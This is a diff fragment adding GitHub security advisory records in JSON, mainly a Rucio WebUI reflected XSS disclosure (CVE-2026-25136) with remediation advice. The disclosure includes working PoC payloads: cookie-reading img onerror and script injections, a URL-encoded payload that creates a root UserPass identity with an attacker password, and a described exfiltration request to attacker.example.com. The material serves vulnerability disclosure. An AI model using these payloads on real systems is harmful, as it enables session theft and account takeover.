+      "https://github.com/FelixSchwarz/mjml-python/security/advisories/GHSA-578p-fxmm-6229",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-26151",
+      "https://github.com/FelixSchwarz/mjml-python/issues/52",
+      "https://github.com/FelixSchwarz/mjml-python/commit/84c495da20a91640a1ca551ace17df7f3be644aa",
+      "https://github.com/FelixSchwarz/mjml-python/commit/8d410b7a500703080bb14ed7e3d2663fe16767e6",
+      "https://github.com/FelixSchwarz/mjml-python/releases/tag/v0.11.0",
+      "https://github.com/advisories/GHSA-578p-fxmm-6229"
+    ],
+    "patch_urls": [
+      "https://github.com/FelixSchwarz/mjml-python/commit/84c495da20a91640a1ca551ace17df7f3be644aa",
+      "https://github.com/FelixSchwarz/mjml-python/commit/8d410b7a500703080bb14ed7e3d2663fe16767e6"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "mjml",
+        "ecosystem": "pip",
+        "vulnerable_range": "= 0.10.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-h79m-5jjm-jm4q",
+    "cve_id": "CVE-2026-25136",
+    "summary": "Rucio WebUI has a Reflected Cross-site Scripting Vulnerability",
+    "description": "### Summary\nA reflected Cross-site Scripting vulnerability was located in the rendering of the ExceptionMessage of the WebUI 500 error which could allow attackers to steal login session tokens of users who navigate to a specially crafted URL.\n\n#### Details\nThe WebUI error message renders `ExceptionMessage` (which can contain user-controlled input) as unencoded HTML. Server code that produces the message is in `common.py` - specifically `error_headers -> _error_response -> generate_http_error_flask`, which places `ExceptionMessage` into both response headers and the JSON body. The WebUI client then injects that text into the DOM using unsafe methods (examples in `lib/rucio/web/ui/static/*.js` such as `rule.js`, `request_rule.js`, `list_rules.js`) with `jQuery.html(...)` or equivalent, enabling reflected XSS when an attacker-controlled value is included in an error message (e.g. account, attribute, scope).\n\n### PoC\n1) Reflected XSS via account parameter (browse or load URL in WebUI context):\n```text\nhttps://127.0.0.1:8443/ui/account_rse_usage?account=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E\n```\nServer response (excerpt):\n```http\nHTTP/1.1 500 INTERNAL SERVER ERROR\nExceptionClass: AccountNotFound\nExceptionMessage: Account <img src=x onerror=alert(document.cookie)> does not exist\nContent-Type: application/octet-stream\n\n{\"ExceptionClass\":\"AccountNotFound\",\"ExceptionMessage\":\"Account <img src=x onerror=alert(document.cookie)> does not exist\"}\n```\n\n**XSS payload triggering (Displaying session token) when browsing to crafted URL**\n<img width=\"1210\" height=\"510\" alt=\"XSS payload triggering (Displaying session token) when browsing to crafted URL\" src=\"https://github.com/user-attachments/assets/989a0aed-628d-4f1c-bbfb-de434dab8af6\" />\n\nWhen the WebUI inserts `ExceptionMessage` into the page with `.html(...)`, the injected <img onerror=...> executes and displays the users' session tokens. Note that this is a PoC only, an attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).\n\n2) Reflected XSS via account key attribute creation error:\n```http\nPOST /proxy/accounts/pentest/attr/XSS HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nOrigin: https://127.0.0.1:8443\nX-Rucio-Script: webui::-ui-account\n{\"key\":\"XSS\",\"value\":\"<script>alert(document.cookie)</script>\"}\n```\n\n**XSS payload triggering (Displaying session token) on error when creating account key**\n<img width=\"1322\" height=\"593\" alt=\"XSS payload triggering (Displaying session token) on error when creating account key\" src=\"https://github.com/user-attachments/assets/151cb0ad-e4f0-498e-954e-be3455ca8a72\" />\n\nServer response (excerpt) contains `ExceptionMessage` with the raw `<script>` payload; the WebUI renders it unsafely and script executes. Note that this method is less impactful since it's not something that can be triggered with a URL alone, but is listed to show that this issue affects multiple locations.\n\n### Impact\nAny authenticated WebUI user who follows a crafted link or triggers a request containing attacker-controlled input in a field that causes an error may execute arbitrary JavaScript in the WebUI origin. This vulnerability is more impactful due to the lack of protection of cookies (The Session token does not have HttpOnly attribute) and lack of Content Security Policy that would prevent thrid-party scripts from loading.\n\nAttackers can steal session cookies/tokens or perform actions as the victim like creating a new UserPass identity with an attacker known password. \n\n**Example URL to Create UserPass for Root**\n```\nhttps://localhost:8443/ui/account_rse_usage?account=%3Cimg%20src%3Dx%20onerror%3D(function()%7Bo%3D%7B%7D%3Bo.method%3D'PUT'%3Bo.credentials%3D'include'%3Bo.headers%3D%7B'X-Rucio-Username'%3A'attackeruser'%2C'X-Rucio-Password'%3A'AttackerPassword123'%2C'X-Rucio-Email'%3A'demo%40example.org'%2C'X-Rucio-Auth-Token'%3Atoken%7D%3Bfetch(String.fromCharCode(47)%2B'identities'%2BString.fromCharCode(47)%2B'root'%2BString.fromCharCode(47)%2B'userpass'%2Co)%7D)()%3E\n```\n\n**Account Payload to Create UserPass**\n```html\n<img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()>\n```\n\n**Creating identity for Root account via reflected XSS**\n<img width=\"1558\" height=\"957\" alt=\"Creating identity for Root account via reflected XSS\" src=\"https://github.com/user-attachments/assets/539bfff4-70f3-42c5-b83a-10b5f85d6d44\" />\n\nAll WebUI users are impacted.\n\n### Remediation / Mitigation\nChange all client-side insertions of server-provided text from `.html(...)` to `.text()` or create text nodes / escape HTML before insertion. Example: replace `$('#elem').html(msg)` with `$('#elem').empty().append($('<span>').text(msg))`.\n\nAdditionally, consider adding a Content Security Policy (CSP) to mitigate external script execution and set the HTTPOnly flag for session cookies. Also, the API token should not be set in a JavaScript variable as it can be accessed by an attacker even with the HTTPOnly flag set on the session cookie.\n\n> Note that many pages were found setting the API token as `token` in an authenticated response like `var token = \"root-root-webui-...:\"` (See `/ui/list_accounts` for example)\n\n#### References:\n- Server functions: `common.py` (`error_headers`, `_error_response, generate_http_error_flask`)\n- Example client files to fix: `lib/rucio/web/ui/static/rule.js`, `lib/rucio/web/ui/static/request_rule.js, list_rules.js`\n- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+    "severity": "high",
+    "cvss_score": 8.1,
+    "cwes": [
+      "CWE-79",
+      "CWE-1004"
+    ],
+    "published_at": "2026-02-25T18:53:29Z",
+    "references": [
+      "https://github.com/rucio/rucio/security/advisories/GHSA-h79m-5jjm-jm4q",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+      "https://github.com/rucio/rucio/releases/tag/35.8.3",
+      "https://github.com/rucio/rucio/releases/tag/38.5.4",
+      "https://github.com/rucio/rucio/releases/tag/39.3.1",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-25136",
+      "https://github.com/advisories/GHSA-h79m-5jjm-jm4q"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "rucio-webui",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 35.8.3"
+      },
+      {
+        "package": "rucio-webui",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 36.0.0rc1, < 38.5.4"
+      },
+      {
+        "package": "rucio-webui",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 39.0.0rc1, < 39.3.1"
+      }
+    ]
+  }
+]
